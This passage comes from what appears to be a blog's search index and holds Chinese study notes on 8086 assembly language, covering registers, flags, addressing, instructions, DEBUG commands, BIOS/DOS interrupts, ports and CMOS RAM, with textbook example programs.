*= []</span><br><span class="line">fmul</span><br><span class="line">;st0 /= []</span><br><span class="line">fdiv</span><br></pre></td></tr></table></figure><h3 id="2-多媒体指令"><a href="#2-多媒体指令" class="headerlink" title="2 多媒体指令"></a>2 多媒体指令</h3><blockquote><p>寄存器是MMX。使用的寄存器也是st0-7，但是名称为MM0-MM7。</p></blockquote><h3 id="3-64位指令"><a href="#3-64位指令" class="headerlink" title="3 64位指令"></a>3 64位指令</h3><hr><h2 id="六、编程技巧"><a href="#六、编程技巧" class="headerlink" title="六、编程技巧"></a>六、编程技巧</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;清空ebx</span><br><span class="line">xor ebx,ebx</span><br><span class="line"></span><br><span class="line">;预留空间</span><br><span class="line">a dword ?</span><br><span class="line"></span><br><span class="line">;windows换行</span><br><span class="line">endl equ &lt;0DH,0AH&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础汇编</title>
      <link href="/posts/a8fb0b6e.html"/>
      <url>/posts/a8fb0b6e.html</url>
      
        <content type="html"><![CDATA[<h1 id="基础汇编"><a href="#基础汇编" class="headerlink" title="基础汇编"></a>基础汇编</h1><hr><h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><ul><li><p>基础</p><blockquote><p><a href=".\8d4b7ae1">text::计算机组成原理</a> </p></blockquote></li><li><p>注意事项</p><ul><li>小端模式：高地址高字节，低地址低字节</li><li>数据不能以字母开头，所以：0FFFFH</li><li>安全空间：0:200H - 0:2FFH</li></ul></li></ul><hr><h2 id="二、寄存器"><a href="#二、寄存器" class="headerlink" title="二、寄存器"></a>二、寄存器</h2><h3 id="1-普通寄存器"><a href="#1-普通寄存器" class="headerlink" title="1 普通寄存器"></a>1 普通寄存器</h3><ul><li><p>通用寄存器</p><blockquote><p>AX，BX，CX，DX（ 分高低位：AH，AL）</p></blockquote><ul><li>AX：累加寄存器。</li><li>BX：基址寄存器，用于内存寻址。（ <code>ds:[bx]</code> ）</li><li>CX：计数寄存器，用于 loop 循环。</li><li>DX：数据寄存器。</li></ul></li><li><p>段寄存器</p><blockquote><p>CS，DS，SS，ES（IP，SP）</p><p>特点：数据不能直接送入段寄存器，需要用寄存器送入段寄存器。</p></blockquote><ul><li><p>CS：代码段寄存器，IP：指令指针寄存器，<code>CS:IP(CS*10H + IP)</code>寻址。</p></li><li><p>DS：数据段寄存器，[p] 的地址寻址默认是 <code>DS:[ p ]</code>。</p></li><li><p>SS：堆栈段寄存器，SP：堆栈指针寄存器，<code>SS:SP</code>指向栈顶元素。</p><blockquote><p>SS被修改后下一条指令也会被执行。</p><p>所以</p><p>mov ss,ax</p><p>mov sp,10 </p><p>会一次性被执行</p></blockquote></li><li><p>ES：附加段寄存器。</p></li></ul></li><li><p>其他</p><ul><li>SI：源变址寄存器（无法分高低位）</li><li>DI：目的变址寄存器（无法分高低位）</li><li>BP：基址指针寄存器（ss:bp 指向内存）</li><li>PSW：标志寄存器（如下）</li></ul></li></ul><h3 id="2-标志寄存器位"><a href="#2-标志寄存器位" class="headerlink" title="2 标志寄存器位"></a>2 标志寄存器位</h3><div class="table-container"><table><thead><tr><th>15</th><th>14</th><th>13</th><th>12</th><th>11</th><th>10</th><th>9</th><th>8</th><th>7</th><th>6</th><th>5</th><th>4</th><th>3</th><th>2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>/</td><td>/</td><td>/</td><td>/</td><td>OF</td><td>DF</td><td>IF</td><td>TF</td><td>SF</td><td>ZF</td><td>/</td><td>AF</td><td>/</td><td>PF</td><td>/</td><td>CF</td></tr></tbody></table></div><blockquote><p><a href="https://blog.csdn.net/liuzhaoze2000/article/details/111667011">原文</a></p><p>标志寄存器PSW是一个16为的寄存器。它反映了CPU运算的状态特征并且存放某些控制标志。8086使用了16位中的9位，包括6个状态标志位和3个控制标志位。</p></blockquote><ul><li><p>CF（Carry flag）</p><blockquote><p>进位标志位。无符号计算在最高位产生了进位或借位时，CF=1；反之，CF=0。</p><p>判断否是溢出的方法是：进行二进制运算时，最高位的进位与次高位的进位值进行异或运算若运算结果为1则表示溢出OF=1 ，否则OF=0。</p><p>三条原则:</p><ol><li>同号相加和异号相减才会发生溢出</li><li>同号相加结果的符号与参与运算的符号不同就溢出</li><li>异号相减结果的符号位与被减数的符号位不同就产生溢出</li></ol></blockquote></li><li><p>ZF（Zero flag）</p><blockquote><p>零标志位。当运算结果全零时，ZF=1；反之，ZF=0。</p></blockquote></li><li><p>SF（Sign flag）</p><blockquote><p>符号标志位。当运算结果为正数，即结果的最高位为0时，SF=0；反之，即结果的最高位为1时，SF=1。</p></blockquote></li><li><p>OF（Over flow flag）</p><blockquote><p>溢出标志位。带符号数运算结果超出了补码所能表示的范围，OF=1；反之，OF=0。OF=最高位进位与次高位进位的异或。</p></blockquote></li><li><p>PF（Parity flag）</p><blockquote><p>奇偶标志。算术逻辑运算的结果中低8位“1”的个数为偶数个时，PF=1；为奇数时，PF=0。</p></blockquote></li><li><p>AF（Auxiliary carry flag）</p><blockquote><p>辅助进位标志。在运算过程中，第四位向第五位有进位或借位时，AF=1；反之，AF=0。</p><p>另外还有三个控制标志位用来控制CPU的操作，可以由程序进行置位和复位。</p></blockquote></li><li><p>TF（Trap Flag）</p><blockquote><p>跟踪标志。当 TF=1 时，CPU进入单步工作方式；当 TF=0 时，正常执行程序。</p></blockquote></li><li><p>IF（Interrupt flag）</p><blockquote><p>中断标志位。当 IF=1 时，CPU可以响应外部可屏蔽中断请求；当 IF=0 时，CPU不响应外部可屏蔽中断请求。但 IF 对不可屏蔽中断或内部中断没有影响。</p></blockquote></li><li><p>DF（Direction flag）</p><blockquote><p>方向标志。当 DF=0 时，si，di递增；当 DF=1 时，si，di递减。</p></blockquote></li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">标志位</th><th>值1</th><th>值0</th></tr></thead><tbody><tr><td style="text-align:left">CF（Carry flag）</td><td>CY(1) carry</td><td>NC(0) no carry</td></tr><tr><td style="text-align:left">ZF（Zero flag）</td><td>ZR(1) zero</td><td>NZ(0) no zero</td></tr><tr><td style="text-align:left">SF（Sign flag）</td><td>NG(1) negative</td><td>PL(0) plus</td></tr><tr><td style="text-align:left">OF（Over flow flag）</td><td>OV(1) overflow</td><td>NV(0) no overflow</td></tr><tr><td style="text-align:left">PF（Parity flag）</td><td>PE(1) parity even</td><td>PO(0) parity odd</td></tr><tr><td style="text-align:left">AF（Auxiliary carry flag）</td><td>AC(1) auxiliary carry</td><td>NA(0) no auxiliary</td></tr><tr><td style="text-align:left">TF（Trap Flag）</td><td>1</td><td>0</td></tr><tr><td style="text-align:left">IF（Interrupt flag）</td><td>EI(1) enable interrupt</td><td>DI(0) disable interrupt</td></tr><tr><td style="text-align:left">DF（Direction flag）</td><td>DN(1) down</td><td>UP(0) up</td></tr></tbody></table></div><h3 id="3-内存寻址"><a href="#3-内存寻址" class="headerlink" title="3 内存寻址"></a>3 内存寻址</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;默认：</span><br><span class="line">ds:[bx]</span><br><span class="line">ds:[bx+idata]</span><br><span class="line">ds:[bx+si] == ds:[bx][si]</span><br><span class="line">ds:[bx+si+idata] == ds:idata[bx][si] == ds:[bx].idata[si] == ds:[bx][si].idata</span><br><span class="line">;正确寻址配合：bx + si/di，bp + si/di</span><br><span class="line"></span><br><span class="line">mov byte ptr ;改一个字节</span><br><span class="line">mov word ptr ;改一个字</span><br></pre></td></tr></table></figure><hr><h2 id="三、程序编译"><a href="#三、程序编译" class="headerlink" title="三、程序编译"></a>三、程序编译</h2><h3 id="1-普通汇编指令"><a href="#1-普通汇编指令" class="headerlink" title="1 普通汇编指令"></a>1 普通汇编指令</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/376928922">cmp</a></p><p>注：() 表示寄存器值</p></blockquote><h4 id="1-1-移动指令"><a href="#1-1-移动指令" class="headerlink" title="1.1 移动指令"></a>1.1 移动指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 将 (bx) 送入 ax</span><br><span class="line">mov ax,bx</span><br><span class="line"></span><br><span class="line">; (ax) 送入栈（以字为单位）（入栈：sp-=2，送入ax）</span><br><span class="line">push ax</span><br><span class="line">; 出栈送入 ax（以字为单位）（出栈：取出ax，sp+=2）</span><br><span class="line">pop ax</span><br><span class="line"></span><br><span class="line">; 占一个字节</span><br><span class="line">nop</span><br><span class="line">; 标志寄存器压栈</span><br><span class="line">pushf</span><br><span class="line">; 标志寄存器出栈</span><br><span class="line">popf</span><br></pre></td></tr></table></figure><h4 id="1-2-运算指令"><a href="#1-2-运算指令" class="headerlink" title="1.2 运算指令"></a>1.2 运算指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; (ax) = (ax) + (bx)</span><br><span class="line">add ax,bx</span><br><span class="line">; (ax) = (ax) - (bx)</span><br><span class="line">sub ax,bx</span><br><span class="line"></span><br><span class="line">; (bx) += 1</span><br><span class="line">inc bx</span><br><span class="line">; (bx) -= 1</span><br><span class="line">dec bx</span><br><span class="line"></span><br><span class="line">; (ax) = (ax) + (bx) + CF（带进位加法，高位可以加 CF 获取低位的进位）</span><br><span class="line">adc ax,bx</span><br><span class="line">; (ax) = (ax) - (bx) - (CF)（带错位减法，同理高位借位）</span><br><span class="line">sbb ax,bx</span><br></pre></td></tr></table></figure><h4 id="1-3-逻辑指令"><a href="#1-3-逻辑指令" class="headerlink" title="1.3 逻辑指令"></a>1.3 逻辑指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; (al) = (al) &amp;&amp; &lt;num&gt;</span><br><span class="line">and al,&lt;num&gt;</span><br><span class="line">; 小写变大写</span><br><span class="line">and al,11011111B</span><br><span class="line"></span><br><span class="line">; (al) = (al) || &lt;num&gt;</span><br><span class="line">or al,&lt;num&gt;</span><br><span class="line">; 大写变小写</span><br><span class="line">or al,00100000B</span><br><span class="line"></span><br><span class="line">; 逻辑移位（移动大于1位需要用cl存数）</span><br><span class="line">shl al,1</span><br><span class="line">shr al,1</span><br><span class="line">mov cl,3</span><br><span class="line">shl al,cl</span><br></pre></td></tr></table></figure><h4 id="1-4-处理机控制指令"><a href="#1-4-处理机控制指令" class="headerlink" title="1.4 处理机控制指令"></a>1.4 处理机控制指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sti ;设置IF=1</span><br><span class="line">cli ;设置IF=0</span><br></pre></td></tr></table></figure><h3 id="2-复杂汇编指令"><a href="#2-复杂汇编指令" class="headerlink" title="2 复杂汇编指令"></a>2 复杂汇编指令</h3><h4 id="2-1-div"><a href="#2-1-div" class="headerlink" title="2.1 div"></a>2.1 div</h4><blockquote><p>内存寻址可以用 byte ptr 或 word ptr 指明大小。</p></blockquote><ul><li><strong>除数：</strong>8b 或 16b，在 [] 或 reg 中。</li><li><strong>被除数：</strong>除数8b，被除数16b，放在ax；除数16b，被除数32b，dx放高16b，ax放低16b。</li><li><strong>商：</strong>除数8b，商在 al 中，余数在 ah 中；除数16b，商在 ax中，余数在 dx 中。</li><li><strong>格式：</strong>div [bx] / reg</li></ul><h4 id="2-2-mul"><a href="#2-2-mul" class="headerlink" title="2.2 mul"></a>2.2 mul</h4><blockquote><p>内存寻址可以用 byte ptr 或 word ptr 指明大小。</p></blockquote><ul><li><strong>乘数：</strong>都 8b，一个在 al，一个是 reg 或 []；都 16b，一个在 ax，一个是 reg 或 []。</li><li><strong>结果：</strong>8b 在 ax，16b 高位 dx，低位 ax。</li></ul><h4 id="2-3-cmp"><a href="#2-3-cmp" class="headerlink" title="2.3 cmp"></a>2.3 cmp</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 比较</span><br><span class="line">cmp ax,bx</span><br><span class="line"></span><br><span class="line">; 等于转移</span><br><span class="line">je label</span><br><span class="line">; 不等于转移</span><br><span class="line">jne label</span><br><span class="line">; 低于转移（below）</span><br><span class="line">jb label</span><br><span class="line">; 不低于转移</span><br><span class="line">jnb label</span><br><span class="line">; 高于转移（above）</span><br><span class="line">ja label</span><br><span class="line">; 不高于转移</span><br><span class="line">jna label</span><br></pre></td></tr></table></figure><h4 id="2-4-串操作"><a href="#2-4-串操作" class="headerlink" title="2.4 串操作"></a>2.4 串操作</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 把 1B / 2B数据从 ds:si 送到 es:di，次数依照 cx</span><br><span class="line">rep movsb</span><br><span class="line">rep movsw</span><br><span class="line">;相当于</span><br><span class="line">s : movsw</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">cld ; DF = 0（递增）</span><br><span class="line">std ; DF = 1（递减）</span><br></pre></td></tr></table></figure><h3 id="3-Debug"><a href="#3-Debug" class="headerlink" title="3 Debug"></a>3 Debug</h3><blockquote><p>debug file.exe：进入debug</p></blockquote><ul><li>R：看寄存器<ul><li><code>-r</code>：查看CPU寄存器内容</li><li><code>-r ax</code>：改寄存器值</li></ul></li><li>D：看机器码<ul><li><code>-d cs:ip</code>：查看指定地址的机器码</li><li><code>-d + -d</code>：连续使用 -d 自动查看下一段地址</li><li><code>-d cs:ip ip</code>：查看指定 ip 段的地址</li></ul></li><li>E：改机器码<ul><li>-<code>e cs:ip</code>：改机器码</li><li><code>-e cs:ip &#39;a&#39; / &quot;a+b&quot;</code>：写入字符或字符串</li></ul></li><li>U：反汇编<ul><li><code>-u cs:ip</code>：反编译（机器码变汇编语言）</li></ul></li><li>T：执行指令<ul><li><code>-t</code>：执行一条指令</li></ul></li><li>A：写汇编<ul><li><code>-a cs:ip</code>：写入汇编语句</li></ul></li><li>other<ul><li><code>-g ip</code>：一次性执行到 ip 处</li><li><code>-p</code>：int 21H要用 p 命令执行</li><li><code>-quit</code>：退出debug</li></ul></li></ul><h3 id="4-程序产生"><a href="#4-程序产生" class="headerlink" title="4 程序产生"></a>4 程序产生</h3><ul><li><p>编译过程</p><ul><li>编译：masm file[.asm]（非 asm 需要后缀，最后加上 ; 直接一次性编译，不用填信息）</li><li>链接：link file[.obj]（非 obj 需要后缀，可加 ; ）<br>数据段和代码段之间会存在一个 PSP（256 B）</li></ul></li><li><p>代码内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 注释符：; </span><br><span class="line">assume cs:codesg,ds:data,ss:stack ; 取别名</span><br><span class="line">data segment</span><br><span class="line">...</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">...</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">codesg segment ; 代码段</span><br><span class="line">start:</span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure></li><li><p>定义大小</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">db ; 字节</span><br><span class="line">dw ; 字</span><br><span class="line">dd ; 双字</span><br><span class="line"></span><br><span class="line">; 循环注入字符</span><br><span class="line">db &lt;num&gt; dup (&#x27;char&#x27;)</span><br><span class="line">; 案例</span><br><span class="line">db 3 dup(0)</span><br><span class="line">db 3 dup(0,1,2)</span><br><span class="line">db 3 dup(&#x27;abc&#x27;,&#x27;ABC&#x27;)</span><br><span class="line"></span><br><span class="line">; 数据段一段字符串结束处设置 dw 0，用于程序找到字符串尾。</span><br></pre></td></tr></table></figure></li></ul><h3 id="5-特殊内存空间"><a href="#5-特殊内存空间" class="headerlink" title="5 特殊内存空间"></a>5 特殊内存空间</h3><ul><li><p>彩色缓冲区</p><blockquote><p>B8000H ~ BFFFFH 的内存空间会显示在显示器上。</p><p>通常是 B80000H ~ B8F9FH 中的 4000 个字节显示在显示器上。</p><p>一行 80 个字符 160 个字节，一页 25 行。</p><p>一个字低位是内容，高位是颜色，含义从（7（BL）闪烁，654（RGB）背景，3（I）高亮，210（RGB）前景）</p></blockquote></li></ul><hr><h2 id="四、转移指令"><a href="#四、转移指令" class="headerlink" title="四、转移指令"></a>四、转移指令</h2><h3 id="1-跳转"><a href="#1-跳转" class="headerlink" title="1 跳转"></a>1 跳转</h3><ul><li><p>原理</p><blockquote><p>定义：可以修改 ip ，或同时修改 cs 和 ip 的指令称为跳转指令。</p><p>8086CPU分类：无条件转移指令（jmp），条件转移指令，循环指令（如：loop），过程，中断。</p></blockquote><ul><li>段内转移：只修改 ip，例：jmp ax。</li><li>段间转移：修改 cs 和 ip。例：jmp 1000:0。</li><li>短转移：ip 变化 -128 ~ 127</li><li>近转移：ip 变化 -32768 ~ 32767</li></ul></li><li><p>指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 获得 label 的 ip（偏移地址）</span><br><span class="line">offset label</span><br><span class="line">; 循环（(cx) -= 1，不为0跳转到标签处，短转移）</span><br><span class="line">loop label</span><br><span class="line">; 跳转（cx = 0 进行短转移，否则向下执行）</span><br><span class="line">jcxz label</span><br></pre></td></tr></table></figure></li><li><p>jmp</p><blockquote><p>jmp 的机器码记录的不是 jmp 的目的地址，而是 jmp 的下一条指令距离 jmp 终点的距离。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 跳转，相当于 mov IP,ax（-128 ~ 127）</span><br><span class="line">jmp ax：</span><br><span class="line">; 短转移</span><br><span class="line">jmp short label</span><br><span class="line">; 近转移</span><br><span class="line">jmp near ptr label</span><br><span class="line">; 远转移</span><br><span class="line">jmp far ptr label</span><br><span class="line">; 段内转移（单字，是新 ip）</span><br><span class="line">jmp word ptr ds:[bx] </span><br><span class="line">; 段间转移（两个字，高字是新 cs，低字是新 ip）</span><br><span class="line">jmp dword ptr ds:[bx]</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-call-和-ret"><a href="#2-call-和-ret" class="headerlink" title="2 call 和 ret"></a>2 call 和 ret</h3><ul><li><p>call label / reg / word ptr ds:[bx]</p><ol><li><blockquote><p><code>(sp) = (sp) - 2</code></p><p><code>((ss)*16 + (sp)) = (ip)</code></p></blockquote></li><li><p><code>(ip) = (ip) + 16位位移</code></p></li></ol></li><li><p>ret</p><ol><li><code>(ip) = ((ss)*16 + (sp))</code></li><li><code>(sp) = (sp) + 2</code></li></ol></li><li><p>call far ptr / dword ptr ds:[bx]</p><ol><li><blockquote><p><code>(sp) = (sp) - 2</code></p><p><code>((ss)*16 + (sp)) = (cs)</code></p><p><code>(sp) = (sp) - 2</code></p><p><code>((ss)*16 + (sp)) = (ip)</code></p></blockquote></li><li><blockquote><p><code>(cs) = label.cs</code></p><p><code>(ip) = label.ip</code></p></blockquote></li></ol></li><li><p>retf</p><ol><li><code>(ip) = ((ss)*16 + (sp))</code></li><li><code>(sp) = (sp) + 2</code></li><li><code>(cs) = ((ss)*16 + (sp))</code></li><li><code>(sp) = (sp) + 2</code></li></ol></li></ul><hr><h2 id="五、中断"><a href="#五、中断" class="headerlink" title="五、中断"></a>五、中断</h2><h3 id="1-内中断"><a href="#1-内中断" class="headerlink" title="1 内中断"></a>1 内中断</h3><ul><li><p>中断向量表</p><blockquote><p>8086PC机，中断向量表指定放在内存地址 0 处，从内存 0000:0000 到 0000:03FF 的 1024 个单元存放中断向量表，放着256个中断源所对应的中断处理程序的入口。</p><p>一般情况下，0000:0200到0000:02FF的256个字节空间所对应的中断向量表项都是空的。</p></blockquote></li><li><p>安装中断</p></li><li><p>设置中断</p></li><li><p>do0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,offset do0;设置ds:si指向的源地址</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,200h;设置es:di指向目的地址</span><br><span class="line">mov cx,offset do0end-offset do0; 设置cx为传输长度</span><br><span class="line">cld;设置传输方向为正</span><br><span class="line">rep movsb</span><br><span class="line">; 设置中断向量表</span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov word ptr es:[0*4],200h</span><br><span class="line">mov word ptr es:[0*4+2],0</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">do0:</span><br><span class="line">jmp short do0start</span><br><span class="line">db &quot;overflow!&quot;</span><br><span class="line">do0start:</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov si,202h;设置ds:si指向字符串</span><br><span class="line"></span><br><span class="line">mov ax,0b800h</span><br><span class="line">mov es,ax</span><br><span class="line">mov di,12*160+36*2;设置es:di指向显存空间的中间位置</span><br><span class="line"></span><br><span class="line">mov cx,9;设置cx为字符串长度</span><br><span class="line">s:mov al,[si]</span><br><span class="line">mov es:[di],al</span><br><span class="line">inc si</span><br><span class="line">add di,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line">do0end:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-int指令"><a href="#2-int指令" class="headerlink" title="2 int指令"></a>2 int指令</h3><ul><li><p>int指令</p><blockquote><p>int n，n 为中断向量码。</p></blockquote><ol><li>取中断类型码 n</li><li>标志寄存器入栈，IF = 0，TF = 0</li><li>CS，IP 入栈</li><li>IP = ( n <em> 4 )，CS = ( n </em> 4 + 2 )</li></ol></li><li><p>int 0H</p><blockquote><p>除法中断，<code>0:[0*4]和0:[0*4+2]</code></p></blockquote></li><li><p>int 9H</p><blockquote><p>向键盘缓冲区写入，键盘输入到达60H端口后同时引发的中断。</p></blockquote></li><li><p>int 10H</p><blockquote><p>屏幕输出中断</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;在屏幕的5行12列显示3个红底高亮闪烁的绿色的&#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">    ;放置光标</span><br><span class="line">    mov ah,2;置光标</span><br><span class="line">    mov bh,0;第0页</span><br><span class="line">    mov dh,5;dh放行号</span><br><span class="line">    mov dl,12;dl放列号</span><br><span class="line">    int 10H</span><br><span class="line"></span><br><span class="line">    ;显示字符</span><br><span class="line">    mov ah,9;在光标处显示字符</span><br><span class="line">    mov al,&#x27;a&#x27;;字符</span><br><span class="line">    mov bl,11001010b;颜色属性（同显存显示格式）</span><br><span class="line">    mov bh,0;第0页</span><br><span class="line">    mov cx,3;字符重复个数</span><br><span class="line">    int 10H</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure></li><li><p>int 13H</p><blockquote><p>磁盘读写</p><p>软盘结构：面——磁道——扇区——字节</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;(ah)=int 13H的功能号（2读扇区，3写扇区）</span><br><span class="line">;(al)=读取的扇区数</span><br><span class="line">;(ch)=磁道号</span><br><span class="line">;(cl)=扇区号</span><br><span class="line">;(dh)=磁头号（软盘即面号，因为一个面用一个磁头来读写）</span><br><span class="line">;(dl)=驱动器号（软驱0开始，0：软驱A，1：软驱B；硬盘从80H开始，80H：C盘，81H：D盘）</span><br><span class="line"></span><br><span class="line">mov ax,0</span><br><span class="line">mov es,ax</span><br><span class="line">mov bx,200H;把es:bx的内容写入磁盘或读取磁盘内容到es:bx</span><br><span class="line">...;上述设置</span><br><span class="line">int 13H</span><br><span class="line"></span><br><span class="line">;成功：(ah)=0，(al)=读入的扇区数</span><br><span class="line">;失败：(ah)=出错代码</span><br></pre></td></tr></table></figure></li><li><p>int 16H</p><blockquote><p>键盘读入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;进行一次键盘读入</span><br><span class="line">mov ah,0</span><br><span class="line">int 16H</span><br><span class="line">;结果(ah)=扫描码，(al)=ASCII码</span><br></pre></td></tr></table></figure></li><li><p>int 21H</p><blockquote><p>调用子程序</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;程序返回</span><br><span class="line">mov ah,4cH;程序返回</span><br><span class="line">mov al,0;返回值</span><br><span class="line">int 21H</span><br><span class="line"></span><br><span class="line">;显示内容（以$作为结束符）</span><br><span class="line">mov ah,9;功能号9，表示在光标位置显示字符串</span><br><span class="line">ds:dx;内容地址</span><br><span class="line">int 21H</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-端口"><a href="#3-端口" class="headerlink" title="3 端口"></a>3 端口</h3><ul><li><p>端口访问</p><blockquote><p>in 和 out 读写数据只能用 al 和 ax。al 是 8位，ax 是 16位。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">in al,60H;从60H端口读入一个字节</span><br><span class="line">out 60H,al;向60H端口写入一个字节</span><br></pre></td></tr></table></figure></li><li><p>CMOS RAM芯片</p><blockquote><p>该芯片有一个实时时钟和一个有128个存储单元的RAM存储器。（早期的计算机为64个字节）</p><p>128个字节的RAM中，内部实时钟占用0~0DH单元来保存时间信息，其余大部分单元保存系统配置信息，供系统启动时BIOS程序读取。</p><p>70H为端口地址，存放要访问的CMOS RAM单元的地址。</p><p>71H为数据端口，存放从选定的CMOS RAM单元中读取的数据。</p><p>时间存放是BCD码存放（BCD码4b，所以8b即可存两位数），时间存放单元如下：</p></blockquote></li></ul><div class="table-container"><table><thead><tr><th>存放单元</th><th>秒：0</th><th>分：2</th><th>时：4</th><th>日：7</th><th>月：8</th><th>年：9</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;读2号单元数据</span><br><span class="line">mov al,2;将2送入al中;因为只能通过ax，al与端口通信</span><br><span class="line">out 70h,al;向70h端口中写入al的值</span><br><span class="line">in al,71h;从71端口中读出数据放到al中 </span><br><span class="line"></span><br><span class="line">;写2号单元数据</span><br><span class="line">mov al,2;先将要写入的地址送入al</span><br><span class="line">out 70h,al;将al的数据送入70h端口</span><br><span class="line">mov al,97;再将要写入的数据送入al</span><br><span class="line">out 71h,al;最后往71号端口写数据</span><br><span class="line"></span><br><span class="line">;读取月份</span><br><span class="line">assume cs:code,ds:data</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">    db &#x27; &#x27;</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">    mov al,8</span><br><span class="line">    out 70H,al</span><br><span class="line">    in al,71H</span><br><span class="line"></span><br><span class="line">    mov ah,al   ;al为读出数据</span><br><span class="line">    mov cl,4</span><br><span class="line">    shr ah,cl   ;ah中存十位</span><br><span class="line">    and al,00001111b    ;al中存个位</span><br><span class="line"></span><br><span class="line">    add ah,30H  ;BCD码变成ASCII码</span><br><span class="line">    add al,30H</span><br><span class="line"></span><br><span class="line">    mov bx,data</span><br><span class="line">    mov ds,bx</span><br><span class="line"></span><br><span class="line">    mov ds:[0],ah</span><br><span class="line">    mov ds:[1],al</span><br><span class="line">    mov byte ptr ds:[2],&#x27;$&#x27;</span><br><span class="line">    mov ah,9</span><br><span class="line">    mov al,0</span><br><span class="line">    mov dx,0</span><br><span class="line">    int 21H</span><br><span class="line">    </span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h3 id="4-外中断"><a href="#4-外中断" class="headerlink" title="4 外中断"></a>4 外中断</h3><ul><li><p>外中断信息</p><blockquote><p>CPU通过端口和外部设备进行联系。</p><p>键盘输入的扫描码在60h端口产生，同时引发int 9中断（向键盘缓冲区写入）。</p><p>在BIOS键盘缓冲区中，一个键盘用一个字存储，高位放扫描码，低位放字符码。键盘缓冲区最多可以存15个键盘输入。</p><p>按下一个键时产生的扫描码称为通码，松开一个键产生的扫描码称为断码。断码=通码+80H。</p></blockquote></li><li><p>键盘输入</p><blockquote><p><a href="https://blog.csdn.net/liuyukuan/article/details/120575746">键盘扫描码</a></p></blockquote></li></ul><h3 id="5-直接定址表"><a href="#5-直接定址表" class="headerlink" title="5 直接定址表"></a>5 直接定址表</h3><blockquote><p>利用内存空间做个字典</p></blockquote><h3 id="6-BIOS键盘输入和磁盘读写"><a href="#6-BIOS键盘输入和磁盘读写" class="headerlink" title="6 BIOS键盘输入和磁盘读写"></a>6 BIOS键盘输入和磁盘读写</h3><ul><li><p>自启动</p><blockquote><p>CPU一加电初始化 (CS)=0FFFFH，(IP)=0。该处有一个跳转执行，CPU执行后会去执行BIOS中的硬件检测和初始化程序。</p><p>硬件检测完后会调用 int 19H 进行操作系统引导。</p><p>键盘读取：int 16H（缓冲区写入：int 9H）</p><p>磁盘读写：int 13H</p></blockquote></li></ul><hr><h2 id="六、masm32汇编"><a href="#六、masm32汇编" class="headerlink" title="六、masm32汇编"></a>六、masm32汇编</h2><ul><li><a href=".\b81b1ca5">text::masm32汇编</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Html+CSS</title>
      <link href="/posts/9ce61be.html"/>
      <url>/posts/9ce61be.html</url>
      
